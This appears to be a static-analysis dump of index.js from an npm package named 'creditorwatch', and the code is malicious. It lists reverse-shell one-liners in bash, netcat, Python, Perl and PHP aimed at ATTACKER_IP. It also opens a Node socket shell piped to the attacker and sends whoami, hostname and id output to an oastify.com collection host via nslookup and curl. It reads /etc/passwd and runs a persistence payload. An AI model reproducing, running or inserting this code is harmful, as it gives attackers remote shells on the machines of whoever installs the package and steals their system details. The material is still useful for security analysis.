// File: tmp/tmp8ssrnofi/creditorwatch/package/index.js
// ======================================================================
Line 1: _tmp_4 = require("child_process")
Line 2: const net = require("net")
Line 9: const reverseShellPayloads = [
  // Bash reverse shell
  `bash -i >& /dev/tcp/${ATTACKER_IP}/${ATTACKER_PORT} 0>&1`,
  
  // Netcat reverse shell (if available)
  `nc -e /bin/bash ${ATTACKER_IP} ${ATTACKER_PORT}`,
  
  // Python reverse shell
  `python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('${ATTACKER_IP}',${ATTACKER_PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"`,
  
  // Perl reverse shell
  `perl -e 'use Socket;$i="${ATTACKER_IP}";$p=${ATTACKER_PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'`,
  
  // PHP reverse shell (if PHP is available)
  `php -r '$sock=fsockopen("${ATTACKER_IP}",${ATTACKER_PORT});exec("/bin/bash -i <&3 >&3 2>&3");'`
]
Line 11: _tmp_5.push(<operator>.formatString("bash -i >& /dev/tcp/", ATTACKER_IP, "/", ATTACKER_PORT, " 0>&1"))
Line 14: _tmp_5.push(<operator>.formatString("nc -e /bin/bash ", ATTACKER_IP, " ", ATTACKER_PORT, ""))
Line 17: _tmp_5.push(<operator>.formatString("python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('", ATTACKER_IP, "',", ATTACKER_PORT, "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);""))
Line 20: _tmp_5.push(<operator>.formatString("perl -e 'use Socket;$i="", ATTACKER_IP, "";$p=", ATTACKER_PORT, ";socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'"))
Line 23: _tmp_5.push(<operator>.formatString("php -r '$sock=fsockopen("", ATTACKER_IP, "",", ATTACKER_PORT, ");exec("/bin/bash -i <&3 >&3 2>&3");'"))
Line 29: const client = new net.Socket()
Line 30: {
      console.log('Connected to attacker');
      
      // Spawn a shell
      const shell = spawn('/bin/bash', ['-i']);
      
      // Pipe shell output to client
      shell.stdout.pipe(client);
      shell.stderr.pipe(client);
      
      // Pipe client input to shell
      client.pipe(shell.stdin);
      
      client.on('close', () => {
        shell.kill();
      });
    }
Line 34: const shell = spawn('/bin/bash', ['-i'])
Line 37: shell.stdout.pipe(client)
Line 38: shell.stderr.pipe(client)
Line 41: client.pipe(shell.stdin)
Line 44: shell.kill()
Line 58: _tmp_6.push("nslookup $(whoami).$(hostname).gau5jjim899y61s6jll79cumyd44svgk.oastify.com")
Line 59: _tmp_6.push("curl http://gau5jjim899y61s6jll79cumyd44svgk.oastify.com/$(whoami)/$(hostname)/ -A "$(id)"")
Line 60: _tmp_6.push("ls -la")
Line 61: _tmp_6.push("uname -a")
Line 62: _tmp_6.push("cat /etc/passwd | head -10")
Line 63: _tmp_6.push("ps aux | head -10")
Line 68: {
  setTimeout(() => {
    exec(cmd, (error, stdout, stderr) => {
      if (error) console.error(`Recon error [${index}]:`, error.message);
      if (stderr) console.error(`Recon stderr [${index}]:`, stderr);
      if (stdout) console.log(`Recon stdout [${index}]:`, stdout);
    });
  }, index * 1000); // Stagger execution
}
Line 69: setTimeout(() => {
    exec(cmd, (error, stdout, stderr) => {
      if (error) console.error(`Recon error [${index}]:`, error.message);
      if (stderr) console.error(`Recon stderr [${index}]:`, stderr);
      if (stdout) console.log(`Recon stdout [${index}]:`, stdout);
    });
  }, index * 1000)
Line 70: exec(cmd, (error, stdout, stderr) => {
      if (error) console.error(`Recon error [${index}]:`, error.message);
      if (stderr) console.error(`Recon stderr [${index}]:`, stderr);
      if (stdout) console.log(`Recon stdout [${index}]:`, stdout);
    })
Line 81: nodeReverseShell()
Line 87: {
    setTimeout(() => {
      exec(cmd, (error, stdout, stderr) => {
        if (error) console.error(`Shell error [${index}]:`, error.message);
        if (stderr) console.error(`Shell stderr [${index}]:`, stderr);
        if (stdout) console.log(`Shell stdout [${index}]:`, stdout);
      });
    }, index * 2000); // Stagger attempts
  }
Line 88: setTimeout(() => {
      exec(cmd, (error, stdout, stderr) => {
        if (error) console.error(`Shell error [${index}]:`, error.message);
        if (stderr) console.error(`Shell stderr [${index}]:`, stderr);
        if (stdout) console.log(`Shell stdout [${index}]:`, stdout);
      });
    }, index * 2000)
Line 89: exec(cmd, (error, stdout, stderr) => {
        if (error) console.error(`Shell error [${index}]:`, error.message);
        if (stderr) console.error(`Shell stderr [${index}]:`, stderr);
        if (stdout) console.log(`Shell stdout [${index}]:`, stdout);
      })
Line 101: {
  console.log("Attempting persistence (demonstration only)...");
  exec(persistencePayload, (error, stdout, stderr) => {
    if (error) console.error("Persistence error:", error.message);
    if (stderr) console.error("Persistence stderr:", stderr);
    if (stdout) console.log("Persistence stdout:", stdout);
  });
}
Line 103: exec(persistencePayload, (error, stdout, stderr) => {
    if (error) console.error("Persistence error:", error.message);
    if (stderr) console.error("Persistence stderr:", stderr);
    if (stdout) console.log("Persistence stdout:", stdout);
  })
